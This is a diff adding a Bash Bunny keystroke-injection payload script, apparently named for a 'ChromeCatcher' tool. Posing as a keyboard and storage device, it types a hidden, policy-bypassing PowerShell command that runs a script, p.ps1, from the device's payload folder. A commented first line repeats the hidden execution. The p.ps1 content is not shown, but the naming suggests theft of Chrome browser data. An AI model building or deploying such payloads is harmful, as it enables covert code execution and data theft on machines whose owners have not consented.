@@ -1,0 +1,26 @@
+#powershell -w h -NoP -NonI -Exec Bypass iex C:\DeansStuff\Bunny\ChromeCatcher\p.ps1
+# Title:
+# Author:
+# Version:
+# Tested on:
+#
+#
+#
+#
+#
+#
+#
+#!/bin/bash
+LED SETUP
+
+GET SWITCH_POSITION
+
+ATTACKMODE HID STORAGE
+
+QUACK DELAY 7000
+LED STAGE1
+QUACK SET_LANGUAGE gb
+RUN WIN powershell -w h -NoP -NonI -Exec Bypass ".((gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\\$SWITCH_POSITION\p.ps1')"
+QUACK DELAY 100
+QUACK ENTER
+LED FINISH
